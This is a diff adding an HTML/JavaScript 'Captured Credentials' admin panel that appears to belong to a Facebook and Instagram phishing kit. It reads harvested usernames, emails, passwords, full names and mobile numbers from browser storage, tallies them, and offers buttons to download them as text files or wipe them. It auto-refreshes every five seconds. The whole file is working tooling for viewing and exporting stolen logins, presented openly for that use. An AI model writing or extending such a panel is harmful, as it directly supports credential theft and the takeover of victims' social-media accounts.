@@ -1,0 +1,566 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Panel - Captured Credentials</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+
+        .header {
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+            margin-bottom: 30px;
+            text-align: center;
+        }
+
+        h1 {
+            color: #333;
+            margin-bottom: 10px;
+            font-size: 32px;
+        }
+
+        .subtitle {
+            color: #666;
+            font-size: 14px;
+        }
+
+        .stats {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 20px;
+            margin-bottom: 30px;
+        }
+
+        .stat-card {
+            background: white;
+            padding: 25px;
+            border-radius: 10px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+
+        .stat-number {
+            font-size: 48px;
+            font-weight: bold;
+            color: #667eea;
+            margin-bottom: 10px;
+        }
+
+        .stat-label {
+            color: #666;
+            font-size: 16px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .controls {
+            background: white;
+            padding: 25px;
+            border-radius: 10px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+            margin-bottom: 30px;
+            display: flex;
+            gap: 15px;
+            flex-wrap: wrap;
+            justify-content: center;
+        }
+
+        button {
+            padding: 12px 30px;
+            font-size: 16px;
+            font-weight: 600;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .btn-primary {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+        }
+
+        .btn-success {
+            background: linear-gradient(135deg, #11998e 0%, #38ef7d 100%);
+            color: white;
+        }
+
+        .btn-danger {
+            background: linear-gradient(135deg, #eb3349 0%, #f45c43 100%);
+            color: white;
+        }
+
+        .btn-info {
+            background: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%);
+            color: white;
+        }
+
+        button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+        }
+
+        button:active {
+            transform: translateY(0);
+        }
+
+        .data-container {
+            background: white;
+            padding: 25px;
+            border-radius: 10px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+        }
+
+        .tabs {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 20px;
+            border-bottom: 2px solid #e0e0e0;
+        }
+
+        .tab {
+            padding: 12px 24px;
+            background: transparent;
+            border: none;
+            border-bottom: 3px solid transparent;
+            cursor: pointer;
+            font-weight: 600;
+            color: #666;
+            transition: all 0.3s ease;
+        }
+
+        .tab.active {
+            color: #667eea;
+            border-bottom-color: #667eea;
+        }
+
+        .tab-content {
+            display: none;
+        }
+
+        .tab-content.active {
+            display: block;
+        }
+
+        .credential-card {
+            background: #f8f9fa;
+            padding: 20px;
+            border-radius: 8px;
+            margin-bottom: 15px;
+            border-left: 4px solid #667eea;
+            position: relative;
+        }
+
+        .credential-card.instagram {
+            border-left-color: #E1306C;
+        }
+
+        .credential-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+
+        .credential-number {
+            font-weight: bold;
+            color: #667eea;
+            font-size: 18px;
+        }
+
+        .credential-time {
+            color: #999;
+            font-size: 12px;
+        }
+
+        .credential-field {
+            margin-bottom: 10px;
+            display: grid;
+            grid-template-columns: 150px 1fr;
+            gap: 10px;
+        }
+
+        .field-label {
+            font-weight: 600;
+            color: #555;
+        }
+
+        .field-value {
+            color: #333;
+            word-break: break-all;
+            font-family: 'Courier New', monospace;
+            background: white;
+            padding: 5px 10px;
+            border-radius: 4px;
+        }
+
+        .empty-state {
+            text-align: center;
+            padding: 60px 20px;
+            color: #999;
+        }
+
+        .empty-state svg {
+            width: 100px;
+            height: 100px;
+            margin-bottom: 20px;
+            opacity: 0.3;
+        }
+
+        .badge {
+            display: inline-block;
+            padding: 4px 12px;
+            border-radius: 12px;
+            font-size: 12px;
+            font-weight: 600;
+            text-transform: uppercase;
+        }
+
+        .badge-login {
+            background: #e3f2fd;
+            color: #1976d2;
+        }
+
+        .badge-signup {
+            background: #e8f5e9;
+            color: #388e3c;
+        }
+
+        @media (max-width: 768px) {
+            .credential-field {
+                grid-template-columns: 1fr;
+            }
+
+            .controls {
+                flex-direction: column;
+            }
+
+            button {
+                width: 100%;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🔐 Admin Panel</h1>
+            <p class="subtitle">Captured Credentials Dashboard</p>
+        </div>
+
+        <div class="stats">
+            <div class="stat-card">
+                <div class="stat-number" id="fbCount">0</div>
+                <div class="stat-label">Facebook Credentials</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number" id="igCount">0</div>
+                <div class="stat-label">Instagram Credentials</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number" id="totalCount">0</div>
+                <div class="stat-label">Total Captured</div>
+            </div>
+        </div>
+
+        <div class="controls">
+            <button class="btn-primary" onclick="refreshData()">
+                🔄 Refresh Data
+            </button>
+            <button class="btn-success" onclick="downloadFacebook()">
+                ⬇️ Download Facebook
+            </button>
+            <button class="btn-success" onclick="downloadInstagram()">
+                ⬇️ Download Instagram
+            </button>
+            <button class="btn-info" onclick="downloadAll()">
+                📦 Download All
+            </button>
+            <button class="btn-danger" onclick="clearAll()">
+                🗑️ Clear All Data
+            </button>
+        </div>
+
+        <div class="data-container">
+            <div class="tabs">
+                <button class="tab active" onclick="switchTab('facebook')">Facebook</button>
+                <button class="tab" onclick="switchTab('instagram')">Instagram</button>
+                <button class="tab" onclick="switchTab('all')">All Data</button>
+            </div>
+
+            <div id="facebook" class="tab-content active"></div>
+            <div id="instagram" class="tab-content"></div>
+            <div id="all" class="tab-content"></div>
+        </div>
+    </div>
+
+    <script>
+        // Load data on page load
+        window.addEventListener('load', function() {
+            refreshData();
+        });
+
+        function refreshData() {
+            const fbData = JSON.parse(localStorage.getItem('capturedCredentials') || '[]');
+            const igData = JSON.parse(localStorage.getItem('capturedInstagramCredentials') || '[]');
+            
+            // Update stats
+            document.getElementById('fbCount').textContent = fbData.length;
+            document.getElementById('igCount').textContent = igData.length;
+            document.getElementById('totalCount').textContent = fbData.length + igData.length;
+
+            // Display Facebook data
+            displayData('facebook', fbData, 'Facebook');
+
+            // Display Instagram data
+            displayData('instagram', igData, 'Instagram');
+
+            // Display all data
+            displayData('all', [...fbData.map(d => ({...d, source: 'Facebook'})), ...igData.map(d => ({...d, source: 'Instagram'}))], 'All');
+        }
+
+        function displayData(containerId, data, source) {
+            const container = document.getElementById(containerId);
+            
+            if (data.length === 0) {
+                container.innerHTML = `
+                    <div class="empty-state">
+                        <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"></path>
+                        </svg>
+                        <h3>No ${source} credentials captured yet</h3>
+                        <p>Credentials will appear here when users submit the login form</p>
+                    </div>
+                `;
+                return;
+            }
+
+            let html = '';
+            data.forEach((cred, index) => {
+                const isInstagram = cred.username || cred.mobile_or_email;
+                const date = new Date(cred.timestamp);
+                const type = cred.type || 'login';
+                
+                html += `
+                    <div class="credential-card ${isInstagram ? 'instagram' : ''}">
+                        <div class="credential-header">
+                            <span class="credential-number">#${index + 1}</span>
+                            <span class="badge ${type.includes('signup') ? 'badge-signup' : 'badge-login'}">${type}</span>
+                        </div>
+                `;
+
+                if (cred.email) {
+                    html += `
+                        <div class="credential-field">
+                            <span class="field-label">Email/Username:</span>
+                            <span class="field-value">${cred.email}</span>
+                        </div>
+                        <div class="credential-field">
+                            <span class="field-label">Password:</span>
+                            <span class="field-value">${cred.password}</span>
+                        </div>
+                    `;
+                }
+
+                if (cred.username && !cred.mobile_or_email) {
+                    html += `
+                        <div class="credential-field">
+                            <span class="field-label">Username:</span>
+                            <span class="field-value">${cred.username}</span>
+                        </div>
+                        <div class="credential-field">
+                            <span class="field-label">Password:</span>
+                            <span class="field-value">${cred.password}</span>
+                        </div>
+                    `;
+                }
+
+                if (cred.mobile_or_email) {
+                    html += `
+                        <div class="credential-field">
+                            <span class="field-label">Mobile/Email:</span>
+                            <span class="field-value">${cred.mobile_or_email}</span>
+                        </div>
+                        <div class="credential-field">
+                            <span class="field-label">Full Name:</span>
+                            <span class="field-value">${cred.full_name}</span>
+                        </div>
+                        <div class="credential-field">
+                            <span class="field-label">Username:</span>
+                            <span class="field-value">${cred.username}</span>
+                        </div>
+                        <div class="credential-field">
+                            <span class="field-label">Password:</span>
+                            <span class="field-value">${cred.password}</span>
+                        </div>
+                    `;
+                }
+
+                if (cred.source) {
+                    html += `
+                        <div class="credential-field">
+                            <span class="field-label">Source:</span>
+                            <span class="field-value">${cred.source}</span>
+                        </div>
+                    `;
+                }
+
+                html += `
+                        <div class="credential-field">
+                            <span class="field-label">Timestamp:</span>
+                            <span class="field-value">${date.toLocaleString()}</span>
+                        </div>
+                        <div class="credential-field">
+                            <span class="field-label">User Agent:</span>
+                            <span class="field-value">${cred.userAgent || 'N/A'}</span>
+                        </div>
+                    </div>
+                `;
+            });
+
+            container.innerHTML = html;
+        }
+
+        function switchTab(tabName) {
+            // Remove active class from all tabs and contents
+            document.querySelectorAll('.tab').forEach(tab => tab.classList.remove('active'));
+            document.querySelectorAll('.tab-content').forEach(content => content.classList.remove('active'));
+
+            // Add active class to selected tab and content
+            event.target.classList.add('active');
+            document.getElementById(tabName).classList.add('active');
+        }
+
+        function downloadFacebook() {
+            downloadCredentials('capturedCredentials', 'Facebook');
+        }
+
+        function downloadInstagram() {
+            downloadCredentials('capturedInstagramCredentials', 'Instagram');
+        }
+
+        function downloadAll() {
+            const fbData = JSON.parse(localStorage.getItem('capturedCredentials') || '[]');
+            const igData = JSON.parse(localStorage.getItem('capturedInstagramCredentials') || '[]');
+            const allData = [
+                ...fbData.map(d => ({...d, source: 'Facebook'})),
+                ...igData.map(d => ({...d, source: 'Instagram'}))
+            ];
+
+            if (allData.length === 0) {
+                alert('No credentials to download.');
+                return;
+            }
+
+            let content = '=== ALL CAPTURED CREDENTIALS ===\n\n';
+            content += `Total Entries: ${allData.length}\n`;
+            content += `Facebook: ${fbData.length}\n`;
+            content += `Instagram: ${igData.length}\n`;
+            content += `Generated: ${new Date().toISOString()}\n`;
+            content += '='.repeat(50) + '\n\n';
+
+            allData.forEach((cred, index) => {
+                content += formatCredential(cred, index + 1);
+            });
+
+            downloadFile(content, `all-credentials-${Date.now()}.txt`);
+        }
+
+        function downloadCredentials(storageKey, platform) {
+            const data = JSON.parse(localStorage.getItem(storageKey) || '[]');
+
+            if (data.length === 0) {
+                alert(`No ${platform} credentials to download.`);
+                return;
+            }
+
+            let content = `=== ${platform.toUpperCase()} CAPTURED CREDENTIALS ===\n\n`;
+            content += `Total Entries: ${data.length}\n`;
+            content += `Generated: ${new Date().toISOString()}\n`;
+            content += '='.repeat(50) + '\n\n';
+
+            data.forEach((cred, index) => {
+                content += formatCredential(cred, index + 1);
+            });
+
+            downloadFile(content, `${platform.toLowerCase()}-credentials-${Date.now()}.txt`);
+        }
+
+        function formatCredential(cred, index) {
+            let text = `Entry #${index}\n`;
+            text += `-`.repeat(30) + '\n';
+
+            if (cred.source) text += `Source: ${cred.source}\n`;
+            if (cred.email) {
+                text += `Email/Username: ${cred.email}\n`;
+                text += `Password: ${cred.password}\n`;
+            }
+            if (cred.username && !cred.mobile_or_email) {
+                text += `Username: ${cred.username}\n`;
+                text += `Password: ${cred.password}\n`;
+            }
+            if (cred.mobile_or_email) {
+                text += `Mobile/Email: ${cred.mobile_or_email}\n`;
+                text += `Full Name: ${cred.full_name}\n`;
+                text += `Username: ${cred.username}\n`;
+                text += `Password: ${cred.password}\n`;
+            }
+            
+            text += `Type: ${cred.type || 'login'}\n`;
+            text += `Timestamp: ${cred.timestamp}\n`;
+            if (cred.platform) text += `Platform: ${cred.platform}\n`;
+            text += `User Agent: ${cred.userAgent}\n\n`;
+
+            return text;
+        }
+
+        function downloadFile(content, filename) {
+            const blob = new Blob([content], { type: 'text/plain' });
+            const url = window.URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = filename;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            window.URL.revokeObjectURL(url);
+            
+            alert('Downloaded successfully!');
+        }
+
+        function clearAll() {
+            if (confirm('⚠️ Are you sure you want to delete ALL captured credentials?\n\nThis action cannot be undone!')) {
+                localStorage.removeItem('capturedCredentials');
+                localStorage.removeItem('capturedInstagramCredentials');
+                refreshData();
+                alert('✅ All credentials have been cleared!');
+            }
+        }
+
+        // Auto-refresh every 5 seconds
+        setInterval(refreshData, 5000);
+    </script>
+</body>
+</html>
